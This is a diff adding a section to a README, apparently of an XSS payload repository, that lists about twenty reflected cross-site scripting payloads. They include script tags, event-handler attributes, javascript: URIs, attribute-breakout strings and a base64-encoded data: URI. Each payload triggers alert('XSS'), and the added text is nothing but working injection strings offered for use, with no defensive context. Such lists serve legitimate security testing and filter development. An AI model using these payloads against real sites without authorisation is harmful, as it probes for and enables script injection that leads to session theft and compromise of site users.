@@ -104,3 +104,31 @@ This repository features payloads for the following XSS attack types:
 
 ---
 
+## 📋 Reflected XSS Payloads
+
+### Common Reflected XSS Payloads
+- `<script>alert('XSS')</script>`
+- `"><script>alert('XSS')</script>`
+- `<img src=x onerror=alert('XSS')>`
+- `<svg onload=alert('XSS')>`
+- `<iframe src="javascript:alert('XSS')"></iframe>`
+- `<body onload=alert('XSS')>`
+- `<link rel="stylesheet" href="javascript:alert('XSS')">`
+- `<a href="javascript:alert('XSS')">Click me</a>`
+- `<input value="" onfocus="alert('XSS')">`
+- `<div onmouseover="alert('XSS')">Hover me</div>`
+
+### Advanced Reflected XSS Techniques
+- `"><img src=x onerror=alert('XSS')>`
+- `"><svg onload=alert('XSS')>`
+- `<img src=1 onerror='alert("XSS")'>`
+- `<svg><script>alert('XSS')</script>`
+- `javascript:alert('XSS')`
+- `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
+- `<iframe src="javascript:alert('XSS')"></iframe>`
+- `" onfocus="alert('XSS')" autofocus`
+- `" onclick="alert('XSS')">Click me`
+- `'><img src=x onerror=alert('XSS')>`
+
+---
+
